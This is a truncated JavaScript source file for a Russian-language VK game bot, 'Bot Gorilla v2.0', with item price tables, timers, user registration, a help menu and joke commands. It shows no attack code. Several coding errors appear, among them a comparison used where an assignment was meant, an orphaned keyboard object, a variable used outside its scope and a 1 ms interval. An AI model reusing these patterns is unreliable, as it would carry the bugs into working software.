console.log('')
console.log('-------------------------------')
console.log('  Скрипт Bot Gorilla v2.0')
console.log('  Разработчик: Sergeu Shabolin')
console.log('  vk.com/shabolin209')

console.log('-------------------------------')
console.log('')

// ВСЕ НАСТРОЙКИ В ФАЙЛЕ /database/settings.json! 

const { VK } = require('vk-io');
const vk = new VK();
const commands = [];
const clans = require('./database/clans.json');
const request = require('prequest');

const cars = [
	{
		name: 'Самокат',
		cost: 500,
		id: 1
	},
	{
		name: 'Велосипед',
		cost: 2500,
		id: 2
	},
	{
		name: 'Гироскутер',
		cost: 5000,
		id: 3
	},
	{
		name: 'Сегвей',
		cost: 7500,
		id: 4
	},
	{
		name: 'Мопед',
		cost: 25000,
		id: 5
	},
	{
		name: 'Мотоцикл',
		cost: 50000,
		id: 6
	},
	{
		name: 'ВАЗ 2109',
		cost: 75000,
		id: 7
	},
	{
		name: 'Квадроцикл',
		cost: 80000,
		id: 8
	},
	{
		name: 'Багги',
		cost: 135000,
		id: 9
	},
	{
		name: 'Вездеход',
		cost: 200000,
		id: 10
	},
	{
		name: 'Лада Xray',
		cost: 350000,
		id: 11
	},
	{
		name: 'Audi Q7',
		cost: 750000,
		id: 12
	},
	{
		name: 'BMW X6',
		cost: 1000000,
		id: 13
	},
	{
		name: 'Toyota FT-HS',
		cost: 1750000,
		id: 14
	},
	{
		name: 'BMW Z4 M',
		cost: 2500000,
		id: 15
	},
	{
		name: 'Subaru WRX STI',
		cost: 2750000,
		id: 16
	},
	{
		name: 'Lamborghini Veneno',
		cost: 3000000,
		id: 17
	},
	{
		name: 'Tesla Roadster',
		cost: 4500000,
		id: 18
	},
	{
		name: 'Yamaha YZF R6',
		cost: 5000000,
		id: 19
	},
	{
		name: 'Bugatti Chiron',
		cost: 6500000,
		id: 20
	},
	{
		name: 'Thrust SSC',
		cost: 35000000,
		id: 21
	},
	{
		name: 'Ferrari LaFerrari',
		cost: 39000000,
		id: 22
	},
	{
		name: 'Koenigsegg Regear',
		cost: 50000000,
		id: 23
	},
	{
		name: 'Tesla Semi',
		cost: 75000000,
		id: 24
	},
	{
		name: 'Venom GT',
		cost: 125000000,
		id: 25
	},
	{
		name: 'Rolls-Royce',
		cost: 200000000,
		id: 26
	}
];

const yachts = [
	{
		name: 'Ванна',
		cost: 10000,
		id: 1
	},
	{
		name: 'Nauticat 331',
		cost: 10000000,
		id: 2
	},
	{
		name: 'Nordhavn 56 MS',
		cost: 15000000,
		id: 3
	},
	{
		name: 'Princess 60',
		cost: 25000000,
		id: 4
	},
	{
		name: 'Azimut 70',
		cost: 35000000,
		id: 5
	},
	{
		name: 'Dominator 40M',
		cost: 50000000,
		id: 6
	},
	{
		name: 'Moonen 124',
		cost: 60000000,
		id: 7
	},
	{
		name: 'Wider 150',
		cost: 65000000,
		id: 8
	},
	{
		name: 'Palmer Johnson 42M SuperSport',
		cost: 80000000,
		id: 9
	},
	{
		name: 'Wider 165',
		cost: 85000000,
		id: 10
	},
	{
		name: 'Eclipse',
		cost: 150000000,
		id: 11
	},
	{
		name: 'Dubai',
		cost: 300000000,
		id: 12
	},
	{
		name: 'Streets of Monaco',
		cost: 750000000,
		id: 13
	}
];

const airplanes = [
	{
		name: 'Параплан',
		cost: 100000,
		id: 1
	},
	{
		name: 'АН-2',
		cost: 350000,
		id: 2
	},
	{
		name: 'Cessna-172E',
		cost: 700000,
		id: 3
	},
	{
		name: 'Supermarine Spitfire',
		cost: 1000000,
		id: 4
	},
	{
		name: 'BRM NG-5',
		cost: 1400000,
		id: 5
	},
	{
		name: 'Cessna T210',
		cost: 2600000,
		id: 6
	},
	{
		name: 'Beechcraft 1900D',
		cost: 5500000,
		id: 7
	},
	{
		name: 'Cessna 550',
		cost: 8000000,
		id: 8
	},
	{
		name: 'Hawker 4000',
		cost: 22400000,
		id: 9
	},
	{
		name: 'Learjet 31',
		cost: 45000000,
		id: 10
	},
	{
		name: 'Airbus A318',
		cost: 85000000,
		id: 11
	},
	{
		name: 'F-35A',
		cost: 160000000,
		id: 12
	},
	{
		name: 'Boeing 747-430 Custom',
		cost: 225000000,
		id: 13
	},
	{
		name: 'C-17A Globemaster III',
		cost: 350000000,
		id: 14
	},
	{
		name: 'F-22 Raptor',
		cost: 400000000,
		id: 15
	},
	{
		name: 'Airbus 380 Custom',
		cost: 600000000,
		id: 16
	},
	{
		name: 'B-2 Spirit Stealth Bomber',
		cost: 1359000000,
		id: 17
	}
];

const helicopters = [
	{
		name: 'Шарик с пропеллером',
		cost: 2,
		id: 1
	},
	{
		name: 'RotorWay Exec 162F',
		cost: 300000,
		id: 2
	},
	{
		name: 'Robinson R44',
		cost: 450000,
		id: 3
	},
	{
		name: 'Hiller UH-12C',
		cost: 1300000,
		id: 4
	},
	{
		name: 'AW119 Koala',
		cost: 2500000,
		id: 5
	},
	{
		name: 'MBB BK 117',
		cost: 4000000,
		id: 6
	},
	{
		name: 'Eurocopter EC130',
		cost: 7500000,
		id: 7
	},
	{
		name: 'Leonardo AW109 Power',
		cost: 10000000,
		id: 8
	},
	{
		name: 'Sikorsky S-76',
		cost: 15000000,
		id: 9
	},
	{
		name: 'Bell 429WLG',
		cost: 19000000,
		id: 10
	},
	{
		name: 'NHI NH90',
		cost: 35000000,
		id: 11
	},
	{
		name: 'Kazan Mi-35M',
		cost: 60000000,
		id: 12
	},
	{
		name: 'Bell V-22 Osprey',
		cost: 135000000,
		id: 13
	}
];

const homes = [
	{
		name: 'Коробка из-под холодильника',
		cost: 250,
		id: 1
	},
	{
		name: 'Подвал',
		cost: 3000,
		id: 2
	},
	{
		name: 'Палатка',
		cost: 3500,
		id: 3
	},
	{
		name: 'Домик на дереве',
		cost: 5000,
		id: 4
	},
	{
		name: 'Полуразрушенный дом',
		cost: 10000,
		id: 5
	},
	{
		name: 'Дом в лесу',
		cost: 25000,
		id: 6
	},
	{
		name: 'Деревянный дом',
		cost: 37500,
		id: 7
	},
	{
		name: 'Дача',
		cost: 125000,
		id: 8
	},
	{
		name: 'Кирпичный дом',
		cost: 80000,
		id: 9
	},
	{
		name: 'Коттедж',
		cost: 450000,
		id: 10
	},
	{
		name: 'Особняк',
		cost: 1250000,
		id: 11
	},
	{
		name: 'Дом на Рублёвке',
		cost: 5000000,
		id: 12
	},
	{
		name: 'Личный небоскрёб',
		cost: 7000000,
		id: 13
	},
	{
		name: 'Остров с особняком',
		cost: 12500000,
		id: 14
	},
	{
		name: 'Белый дом',
		cost: 20000000,
		id: 15
	}
];

const apartments = [
	{
		name: 'Чердак',
		cost: 15000,
		id: 1
	},
	{
		name: 'Квартира в общежитии',
		cost: 55000,
		id: 2
	},
	{
		name: 'Однокомнатная квартира',
		cost: 175000,
		id: 3
	},
	{
		name: 'Двухкомнатная квартира',
		cost: 260000,
		id: 4
	},
	{
		name: 'Четырехкомнатная квартира',
		cost: 500000,
		id: 5
	},
	{
		name: 'Квартира в центре Москвы',
		cost: 1600000,
		id: 6
	},
	{
		name: 'Двухуровневая квартира',
		cost: 4000000,
		id: 7
	},
	{
		name: 'Квартира с Евроремонтом',
		cost: 6000000,
		id: 8
	}
];

const phones = [
	{
		name: 'Nokia 108',
		cost: 250,
		id: 1
	},
	{
		name: 'Nokia 3310 (2017)',
		cost: 500,
		id: 2
	},
	{
		name: 'ASUS ZenFone 4',
		cost: 2000,
		id: 3
	},
	{
		name: 'BQ Aquaris X',
		cost: 10000,
		id: 4
	},
	{
		name: 'Sony Xperia XA',
		cost: 15000,
		id: 5
	},
	{
		name: 'Samsung Galaxy S8',
		cost: 30000,
		id: 6
	},
	{
		name: 'Xiaomi Mi Mix',
		cost: 50000,
		id: 7
	},
	{
		name: 'Torex FS1',
		cost: 75000,
		id: 8
	},
	{
		name: 'iPhone X',
		cost: 100000,
		id: 9
	},
	{
		name: 'Мегафон С1',
		cost: 250000,
		id: 10
	}
];

const pets = [
	{
		name: 'Улитка',
		cost: 1000,
		id: 1
	},
	{
		name: 'Лягушка',
		cost: 25000,
		id: 2
	},
	{
		name: 'Заяц',
		cost: 500000,
		id: 3
	},
	{
		name: 'Свинья',
		cost: 300000000,
		id: 4
	},
	{
		name: 'Лиса',
		cost: 1250000000,
		id: 5
	},
	{
		name: 'Собака',
		cost: 5000000000,
		id: 6
	},
	{
		name: 'Панда',
		cost: 30000000000,
		id: 7
	},
	{
		name: 'Горилла',
		cost: 180000000000,
		id: 8
	}
];


const petsupd = [
	{
		cost: 2000,
		id: 1
	},
	{
		cost: 50000,
		id: 2
	},
	{
		cost: 1000000,
		id: 3
	},
	{
		cost: 600000000,
		id: 4
	},
	{
		cost: 2500000000,
		id: 5
	},
	{
		cost: 10000000000,
		id: 6
	},
	{
		cost: 60000000000,
		id: 7
	},
	{
		cost: 360000000000,
		id: 8
	}
];

const farms = [
	{
		name: '6U Nvidia',
		cost: 20500000,
		id: 1
	},
	{
		name: 'AntminerS9',
		cost: 100000000,
		id: 2
	},
	{
		name: 'FM2018-BT200',
		cost: 900000000,
		id: 3
	}
];

const businesses = [
	{
		name: 'Шаурмичная',
		cost: 50000,
		earn: 400,
		id: 1,
		icon: '🥖'
	},
	{
		name: 'Ларёк',
		cost: 10000,
		earn: 700,
		id: 2,
		icon: '🏪'
	},
	{
		name: 'Ресторан',
		cost: 300000,
		earn: 2500,
		id: 3,
		icon: '🍷'
	},
	{
		name: 'Магазин',
		cost: 500000,
		earn: 3800,
		id: 4,
		icon: '🏫'
	},
	{
		name: 'Завод',
		cost: 1500000,
		earn: 8000,
		id: 5,
		icon: '🏭'
	},
	{
		name: 'Шахта',
		cost: 25000000,
		earn: 70000,
		id: 6,
		icon: '⛏'
	},
	{
		name: 'Офис',
		cost: 80000000,
		earn: 220000,
		id: 7,
		icon: '🏢'
	},
	{
		name: 'Разработка игр',
		cost: 150000000,
		earn: 300000,
		id: 8,
		icon: '🕹'
	},
	{
		name: 'Нефтевышка',
		cost: 500000000,
		earn: 700000,
		id: 9,
		icon: '🏜'
	},
	{
		name: 'Атомная электростанция',
		cost: 800000000,
		earn: 1000000,
		id: 10,
		icon: '💡'
	},
	{
		name: 'Космическое агентство',
		cost: 50000000000,
		earn: 50000000,
		id: 11,
		icon: '🗺'
	}
];

const works = [
	{
		name: 'Дворник',
		requiredLevel: 1,
		min: 2000,
		max: 2500,
		id: 1
	},
	{
		name: 'Сантехник',
		requiredLevel: 3,
		min: 3750,
		max: 4000,
		id: 2
	},
	{
		name: 'Электрик',
		requiredLevel: 5,
		min: 4000,
		max: 4500,
		id: 3
	},
	{
		name: 'Слесарь',
		requiredLevel: 8,
		min: 5000,
		max: 5500,
		id: 4
	},
	{
		name: 'Юрист',
		requiredLevel: 10,
		min: 7500,
		max: 8000,
		id: 5
	},
	{
		name: 'Бухгалтер',
		requiredLevel: 14,
		min: 9000,
		max: 9489,
		id: 6
	},
	{
		name: 'Бармен',
		requiredLevel: 22,
		min: 10000,
		max: 12500,
		id: 7
	},
	{
		name: 'Администратор',
		requiredLevel: 25,
		min: 12500,
		max: 13500,
		id: 8
	},
	{
		name: 'Программист',
		requiredLevel: 49,
		min: 16000,
		max: 17500,
		id: 9
	}
];

const utils = {
	sp: (int) => {
		int = int.toString();
		return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join('.').split('').reverse().join('');
	},
	rn: (int, fixed) => {
		if (int === null) return null;
		if (int === 0) return '0';
		fixed = (!fixed || fixed < 0) ? 0 : fixed;
		let b = (int).toPrecision(2).split('e'),
			k = b.length === 1 ? 0 : Math.floor(Math.min(b[1].slice(1), 14) / 3),
			c = k < 1 ? int.toFixed(0 + fixed) : (int / Math.pow(10, k * 3) ).toFixed(1 + fixed),
			d = c < 0 ? c : Math.abs(c),
			e = d + ['', 'тыс', 'млн', 'млрд', 'трлн'][k];

			e = e.replace(/e/g, '');
			e = e.replace(/\+/g, '');
			e = e.replace(/Infinity/g, 'ДОХЕРА');

		return e;
	},
	gi: (int) => {
		int = int.toString();

		let text = ``;
		for (let i = 0; i < int.length; i++)
		{
			text += `${int[i]}&#8419;`;
		}

		return text;
	},
	decl: (n, titles) => { return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2] },
	random: (x, y) => {
		return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
	},
	pick: (array) => {
		return array[utils.random(array.length - 1)];
	}
}

let promo = "0";

const rotateText = {
	q: 'q',
	w: 'ʍ',
	e: 'ǝ',
	r: 'ɹ',
	t: 'ʇ',
	y: 'ʎ',
	u: 'u',
	i: 'ᴉ',
	o: 'o',
	p: 'p',
	a: 'ɐ',
	s: 's',
	d: 'd',
	f: 'ɟ',
	g: 'ƃ',
	h: 'ɥ',
	j: 'ɾ',
	k: 'ʞ',
	l: 'l',
	z: 'z',
	x: 'x',
	c: 'ɔ',
	v: 'ʌ',
	b: 'b',
	n: 'n',
	m: 'ɯ',

	й: 'ņ',
	ц: 'ǹ',
	у: 'ʎ',
	к: 'ʞ',
	е: 'ǝ',
	н: 'н',
	г: 'ɹ',
	ш: 'm',
	щ: 'm',
	з: 'ε',
	х: 'х',
	ъ: 'q',
	ф: 'ф',
	ы: 'ıq',
	в: 'ʚ',
	а: 'ɐ',
	п: 'u',
	р: 'd',
	о: 'о',
	л: 'v',
	д: 'ɓ',
	ж: 'ж',
	э: 'є',
	я: 'ʁ',
	ч: 'һ',
	с: 'ɔ',
	м: 'w',
	и: 'и',
	т: 'ɯ',
	ь: 'q',
	б: 'ƍ',
	ю: 'oı'
}

let btc = 6000;

let smileerror = utils.pick([`😒`, `😯`, `😔`, `🤔`]);
let smilesuccess = utils.pick([`😯`, `🙂`, `🤑`, `☺`]);

let users = require('./database/users.json');
let config = require('./database/settings.json');
let buttons = [];

setTimeout(async () => {
	const rq = await request('https://api.cryptonator.com/api/ticker/btc-usd');

	if(!rq.ticker) return;
	if(!rq.ticker.price) return;

	btc = Math.floor(Number(rq.ticker.price));
}, 5);

setInterval(async () => {
	const rq = await request('https://api.cryptonator.com/api/ticker/btc-usd');

	if(!rq.ticker) return;
	if(!rq.ticker.price) return;

	btc = Math.floor(Number(rq.ticker.price));
}, 60000);

setInterval(async () => {
	await saveUsers();
	await saveClans();
	
	console.log(' База данных успешно сохранена.');
	console.log('');
}, 30000);

setInterval(async () => {

smileerror = utils.pick([`😒`, `😯`, `😔`, `🤔`]);
smilesuccess = utils.pick([`😯`, `🙂`, `🤑`, `☺`]);

}, 1);

setInterval(async () => {
	users.filter(x=> x.misc.farm !== 0).map(x=> {
		var frmbtc = 0;
		if(x.misc.farm === 1)
		{
			frmbtc += 2;
		}

		if(x.misc.farm === 2)
		{
			frmbtc += 10;
		}

		if(x.misc.farm === 3)
		{
			frmbtc += 100;
		}
		var frmbtcm = frmbtc * x.farms;
		x.misc.farm_btc += frmbtcm;
	});
}, 3600000);

setInterval(async () => {
	users.filter(x=> x.settings.old == false).map(x=> {
		x.settings.old == true;
	});
}, 604800);

setInterval(async () => {
	users.map(user => {
		if(user.business)
		{
			const biz = businesses.find(x=> x.id === user.business);
			if(!biz) return;

			user.biz += biz.earn;
		}
	});
}, 3600000);

function clearTemp()
{
	users.map(user => {
		user.timers.hasWorked = false;
		user.timers.bonus = false;
		user.promo = false;
		user.energy = 10;
	});
}

function clearPromo()
{
	promo = 0;
	users.map(user => {
		user.promo = false;
	});
}

function msgError(messagetext)
{
	return bot(`${messagetext} ${utils.pick([`😯`, `🙂`, `🤑`, `☺`])}`);
}

clearTemp();
clearPromo();

async function saveUsers()
{
	require('fs').writeFileSync('./database/users.json', JSON.stringify(users, null, '\t'));
	return true;
}

async function saveConfig()
{
	require('fs').writeFileSync('./database/settings.json', JSON.stringify(config, null, '\t'));
	return true;
}
async function saveClans()
{
	require('fs').writeFileSync('./database/clans.json', JSON.stringify(clans, null, '\t'));
	return true;
}

vk.setOptions({ token: config.grouptoken, pollingGroupId: config.groupid });
const { updates, snippets } = vk;

updates.startPolling();
updates.on('message', async (message) => {
	if(Number(message.senderId) <= 0) return;
	if(/\[public206063289\|(.*)\]/i.test(message.text)) message.text = message.text.replace(/\[public206063289\|(.*)\]/ig, '').trim();

	if(!users.find(x=> x.id === message.senderId))
	{
		const [user_info] = await vk.api.users.get({ user_id: message.senderId });
		const date = new Date();

		users.push({
			id: message.senderId,
			uid: users.length,
			balance: 5000,
			bank: 0,
			btc: 0,
			farm_btc: 0,
			farms: 0,
			farmslimit: 200,
			energy: 10,
			opit: 0,
			biz: 0,
			clan: 0,
			prefix: 0,
   		zhelezo: 0,
			zoloto: 0,
			banadm: false,
			almaz: 0,
			bizlvl: 0,
			nicklimit: 16,
			rating: 0,
			regDate: `${date.getDate()}.${date.getMonth()}.${date.getFullYear()}`,
			mention: true,
			ban: false,
			clanid: null,
			timers: {
				hasWorked: false,
				bonus: false,
				poxod: false,
				poxod2: false,
				kopat: false,
				hack: false
			},
			tag: user_info.first_name,
			work: 0,
			business: 0,
			notifications: true,
			exp: 1,
			level: 1,
			referal: null,
			promo: false,
			transport: {
				car: 0,
				yacht: 0,
				airplane: 0,
				helicopter: 0
			},
			realty: {
				home: 0,
				apartment: 0
			},
			misc: {
				phone: 0,
				farm: 0,
				pet: 0,
			},
			settings: {
				firstmsg: true,
				vip: false, 
				moder: false, 
				adm: false, 
				vlad: false, 
				eval: false, 
				trade: true,
				old: false,
				limit: 100000000000,
			},
			pet: {
				lvl: 0,
				poterl: false
			},
			marriage: {
				partner: 0,
				requests: []
			}, 
			banrep: false
		});
		console.log(` Зарегистрировался новый игрок [Игроков: ${users.length}]`);
		console.log(``);
		saveUsers();
	}

	message.user = users.find(x=> x.id === message.senderId);

	const bot = (text, params) => {
		return message.send(`${message.user.mention ? `@id${message.user.id} (${message.user.tag})` : `${message.user.tag}`}, ${text}`, params);
	}

	if(message.user.ban) return bot(`ваш аккаунт заблокирован ⛔`);

	const command = commands.find(x=> x[0].test(message.text));

	if(message.user.settings.firstmsg)
	{

bot(`, 👋 Привет!
❤ Я игровой Bot Gorilla, во мне довольно много развлекательных команд, которые помогут скоротать время и найти новых друзей. Не забудь, @bot_gorilla_v2(подписаться) чтоб не пропускать конкурсы. 

📖 Узнай все мои команды, введи «помощь»

Беседа с ботом: https://vk.me/join/AJQ1d95mlhzn9GrMQfnniWQ/`, 
		{
			keyboard:JSON.stringify(
		{
			"one_time": true,
			"buttons": [
			[{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"1\"}",
				"label": "🔑 Бонус"
		},
			"color": "positive"
		},
		{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"2\"}",
				"label": "📚 Помощь"
		},
			"color": "primary"
		},
		{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"3\"}",
				"label": "🔋 Ферма"
		},
			"color": "primary"
		}
]
		]
			})
		});

		message.user.settings.firstmsg = false;
		
		vk.api.messages.send({chat_id: 2 ,message: `🔥 K нами присоединился игрок:
		 📝 Имя: @id${user_info.id}(${user_info.first_name})
		 ✅ Я ему присвоил uid: ${message.user.uid}

		 🌐 Всего игроков: ${users.length}`, random_id: 0}).catch((error) => { console.log(` Ошибка. ${error}`);})
		 console.log(`+1 чел ${utils.rn(users.length)}`);
		



		saveUsers();
		return;

	}

	if(!command)
	{

		if(!message.isChat) return bot(`такой команды не существует, отправь «помощь» что бы узнать мои команды.`);
		if(message.isChat) return;

	}

	if(message.user.exp >= 24)
	{
		message.user.exp = 1;
		message.user.level += 1;
	}

	message.args = message.text.match(command[0]);
	await command[1](message, bot);

	saveUsers();
	console.log(` Введена команда: ${message.text}.`)
	console.log(``)
});

const cmd = {
	hear: (p, f) => {
		commands.push([p, f]);
	}
}

cmd.hear(/^(?:помощь|команды|📚 Помощь|меню|help|commands|cmds|menu|начать|start|@destinybot 📚 Помощь)$/i, async (message, bot) => {
	await bot(`мои команды:

🍀 Развлекательные:
🙊 Анекдот
↪ Переверни [фраза]
🔮 Шар [фраза]
📊 Инфа [фраза]
⚖ Выбери [фраза] или [фраза2]

🚀 Игры:
⠀⠀🎲 Кубик [1-6]
⠀⠀🎰 Казино [сумма]
⠀⠀📈 Трейд [вверх/вниз] [сумма]
⠀⠀🥛 Стаканчик [1-3] [сумма]
⠀⠀🔦 Сейф [случайные 2 цифры] 
⠀⠀🍂 Копать
⠀⠀🚕 Таксовать

👔 Работа - список работ
⠀🔨 Работать
⠀❌ Уволиться

💼 Бизнес:
⠀⠀📈 Бизнес - статистика
⠀⠀💵 Бизнес снять
⠀⠀✅ Бизнес улучшить

🌽 Питомцы:
⠀⠀🐒 Питомец - информация
⠀⠀🐪 Питомец поход
⠀⠀🌟 Питомец улучшить


🔥 Полезное:
📠 Реши [пример]
📊 Курс

💡 Разное:
📒 Профиль
💲 Баланс
💰 Банк [сумма/снять сумма]
👑 Рейтинг - ваш рейтинг
✒ Ник [ник/вкл/выкл]
🛒 Магазин
⚔️Клан помощь - команды клана
➖ Продать [предмет]
🔋 Ферма - биткоин ферма
🤝 Передать [id] [сумма]
🏆 Топ
💎 Бонус - ежедневный бонус
👪 Брак [id] - сделать предложение
⠀ ⠀Браки - список предложений
💔 Развод - развестись с кем-то
⌚ Дата [id] - дата регистрации игрока
🎁 Донат
👫 Реферал - деньги за друзей

🆘 Репорт [фраза] - ошибки или пожелания`, );
{
			keyboard:JSON.stringify(
		{
			"one_time": false,
			"buttons": [
			[{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"1\"}",
				"label": "🔑 Бонус"
		},
			"color": "positive"
		},
		{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"2\"}",
				"label": "📚 Помощь"
		},
			"color": "primary"
		},
		{
				"action": {
				"type": "text",
				"payload": "{\"button\": \"3\"}",
				"label": "💾 Профиль"
		},
			"color": "primary"
		}
]
		]
			})
		};
});

cmd.hear(/^(?:помощь)\s(.*)$/i, async (message, bot) => {
	message.args[1] = message.args[1].toLowerCase();

	if(message.args[1] === 'переверни')
	{
		return message.send(`Команда "Переверни" пишет ваш текст вверх ногами (Поддерживаются цифры, буквы латинского и кириллического алфавита, а также некоторые символы)`);
	}

	if(message.args[1] === 'шар')
	{
		return message.send(`Команда "Шар" используя магию рандома выводит случайное сообщение.`);
	}

	if(message.args[1] === 'инфа')
	{
		return message.send(`Команда "Инфа" случайным образом присылает шанс чего-либо. Также можно использовать команды "Шанс" или "Вероятность"`);
	}

	if(message.args[1] === 'выбери')
	{
		return message.send(`Команда "Выбери" случайным образом выбирает один из двух предложенных вариантов.`);
	}

	if(message.args[1] === 'казино')
	{
		return message.send(`Команда "Казино" случайным образом умножает вашу ставку (Могут выпасть множители х0, х0.25, х0.5, x0.75, х1, х2, х5, х50). Чтобы поставить всю сумму введите "Казино все" или "Казино вабанк"`);
	}

	if(message.args[1] === 'кубик')
	{
		return message.send(`Команда "Кубик" сравнивает ваше число со случайным от 1 до 6, если вы угадали, то получаете вознаграждение. Также можно использовать "Куб"`);
	}

	if(message.args[1] === 'трейд')
	{
		return message.send(`Команда "Трейд" - симулятор бинарных опционов. Введите "Трейд вверх (сумма)" если думаете, что курс валюты будет увеличиваться, или "Трейд вниз (сумма)" если будет уменьшаться.`);
	}

	if(message.args[1] === 'стаканчик')
	{
		return message.send(`С помощью команды "Стаканчик" вы можете сыграть в аналог игры "Напёрстки". Чтобы играть введите "Стаканчик [1-3] [сумма]".`);
	}

	if(message.args[1] === 'работа')
	{
		return message.send(`С помощью команды "Работа" вы можете устроиться на одну из работ. Чтобы отрыть новые профессии, вам нужно отработать определённое кол-во игровых недель (Команда "Работать"). Для увольнения с работы введите "Уволиться".`);
	}

	if(message.args[1] === 'бизнес')
	{
		return message.send(`Владея бизнесом, вы можете зарабатывать немало денег:
		Бизнесы [номер] - купить бизнес
		Бизнес - ваш бизнес
		Бизнес снять - снять деньги со счёта бизнеса
		Продать бизнес - продажа бизнеса`);
	}

	if(message.args[1] === 'реши')
	{
		return message.send(`Команда "Реши" решает ваш пример (Реши 5 + 5).
		Команда умеет:
		Складывать (+)
		Вычитать (-)
		Умножать (*)
		Делить (/)`);
	}

	if(message.args[1] === 'курс')
	{
		return message.send(`С помощью команды "Курс" можно узнать курс Биткоина на данный момент.`);
	}

	if(message.args[1] === 'профиль')
	{
		return message.send(`Команда "Профиль" выводит вашу игровую статистику.`);
	}

	if(message.args[1] === 'баланс')
	{
		return message.send(`Команда "Баланс" выводит кол-во валюты на вашем аккаунте.`);
	}

	if(message.args[1] === 'банк')
	{
		return message.send(`При вводе команды "Банк" (без параметров) выводится ваша сумма на счёте. Для того чтобы положить на счёт деньги введите "Банк [сумма]" (Максимум 250.000.000.000$). Чтобы забрать деньги из банка введите "Банк снять/взять [сумма]".
		Сумма в банке увеличивается каждый час (больше сумма - больше прибыль).`);
	}

	if(message.args[1] === 'рейтинг')
	{
		return message.send(`Пустая команда "Рейтинг" (без параметров) выводит ваше кол-во рейтинга (также можно узнать в профиле). При указании параметра (любое число) вы купите данное кол-во единиц рейтинга (👑1 = 250.000.000$). Рейтинг влияет на ваше положение в топе.`);
	}

	if(message.args[1] === 'ник')
	{
		return message.send(`С помощью команды "Ник" можно выбрать себе ник длинною до 15 символов. Также, ник можно делать кликабельным/некликабельным в топе "Ник вкл" и "Ник выкл"`);
	}

	if(message.args[1] === 'магазин')
	{
		return message.send(`Команда "Магазин" выводит список категорий товаров, которые доступны для покупки.`);
	}

	if(message.args[1] === 'продать')
	{
		return message.send(`С помощью команды "Продать" вы можете продать любой предмет (Машину, дом, квартиру, телефон, яхту, самолет, вертолет, биткоин, ферму).`);
	}

	if(message.args[1] === 'передать')
	{
		return message.send(`Команда "Передать" переводит указанную вами сумму любому игроку (Передать ${message.user.uid} 1000).`);
	}

	if(message.args[1] === 'топ')
	{
		return message.send(`Команда "Топ" выводит 10 игроков с самым большим рейтингом.`);
	}

	if(message.args[1].includes('брак'))
	{
		return message.send(`Используя команды "Брак", "Браки", "развод", вы можете жениться/выходить замуж/разводиться.
		Брак [id] - сделать предложение
		Браки - список предложений
		Развод - ...`);
	}

	if(message.args[1] === 'дата')
	{
		return message.send(`Команда "Дата" выводит дату регистрации человека в боте. Можно использовать id человека.`);
	}

	if(message.args[1] === 'репорт')
	{
		return message.send(`С помощью команды "Репорт" вы можете отправить создателю бота любое сообщение. Также можно использовать "Реп", "Жалоба", "Rep".`);
	}
});

cmd.hear(/^(?:переверни)\s([^]+)$/i, async (message, bot) => {
	let text = ``;
	message.args[1].split('').map(x=> {
		if(rotateText[x])
		{
			text += rotateText[x];
		}
	});

	return bot(`держи: "${text.split('').reverse().join('')}"`)
});

cmd.hear(/^(?:анекдот)$/i, async (message, bot) => {

	let textanek = utils.pick(['Разговариваают два американца:\n — У этих русских не только душа другая. Они и устроены по-другому.\n — ?\n — Я сам слышал как один сказал другому — Одень ты на х@й шапку, а то уши замерзнут.', 'Бывает, борешься за что-то, борешься, а потом в один прекрасный момент понимаешь: «А пошло оно все на х@й! » И жить становится намного проще.', '"А это точно поможет? ", — недоверчиво спрашивала царевна Несмеяна, поднося к губам какую-то самокрутку.', 'Чтобы хоть как-то привлечь внимание школьников, преподавательница написала на доске « Жесть. Смотреть всем».', 'Если Патриарх Кирилл верит в Бога, то почему он ездит в бронированном Мерседесе под охраной ФСО за счет бюджета, а не надеется на заступничество своего небесного начальника?']);

	return bot(`анекдот: 

	${textanek}`)
});

cmd.hear(/^(?:шар)\s([^]+)$/i, async (message, bot) => {
	const phrase = utils.pick(['перспективы не очень хорошие', 'сейчас нельзя предсказать', 'пока не ясно', 'знаки говорят - "Да"', 'знаки говорят - "Нет"', 'можешь быть уверен в этом', 'мой ответ - "нет"', 'мой ответ - "да"', 'бесспорно', 'мне кажется - "Да"', 'мне кажется - "Нет"']);
	return bot(phrase);
});

cmd.hear(/^(?:инфа|шанс|вероятность)\s([^]+)$/i, async (message, bot) => {
	const phrase = utils.pick(['шанс этого', 'мне кажется около']);
	const percent = utils.random(100);

	return bot(`${phrase} ${percent}%`)
});

cmd.hear(/^(?:выбери)\s([^]+)\s(?:или)\s([^]+)$/i, async (message, bot) => {
	const first = message.args[1];
	const second = message.args[2];

	const phrase = utils.pick([`конечно ${utils.random(1, 2)} вариант`, `мне кажется, что ${utils.random(1, 2)} вариант лучше`]);
	return bot(`${phrase}`);
});

cmd.hear(/^(?:донат)$/i, async (message, bot) => {
	return bot(`Что узнать список товаров перейдите по ссылке`);
});

cmd.hear(/^(?:профиль|💾 Профиль|проф)$/i, async (message, bot) => {
	let text = ``;

	text += `🔎 ID: ${message.user.uid}\n`;
	text += `🔥 Префикс: ${message.user.prefix.toString().replace(/0/gi, "Челик").replace(/1/gi, "🔥Топер").replace(/2/gi, "✨Ангел").replace(/3/gi, "😈Дьявол").replace(/4/gi, "❤Топ тян").replace(/5/gi, "👑Элита")}\n`;
if(message.user.clanid) text += `⚔ Kлан: ${clans[message.user.clanid].name}\n`;
	text += `💰 Денег: ${utils.sp(message.user.balance)}$\n`;
	text += `💳 В банке: ${utils.sp(message.user.bank)}$\n`;
	text += `💽 Биткоинов: ${utils.sp(message.user.btc)}฿\n`;
	text += `👑 Рейтинг: ${utils.sp(message.user.rating)}\n`;
	if(message.user.work) text += `👔 Работа: ${works[message.user.work - 1].name}\n`;
	if(message.user.marriage.partner) text += `👬 Партнер: ${users[message.user.marriage.partner].tag}`;
	text += `🌟 Уровень: ${message.user.level} [${message.user.exp}/24]\n`;

	if(message.user.transport.car || message.user.transport.yacht || message.user.transport.airplane || message.user.transport.helicopter ||
		message.user.realty.home || message.user.realty.apartment ||
		message.user.misc.phone || message.user.misc.farm || message.user.business || message.user.misc.pet)
	{
		text += `\n🔑 Имущество:\n`;

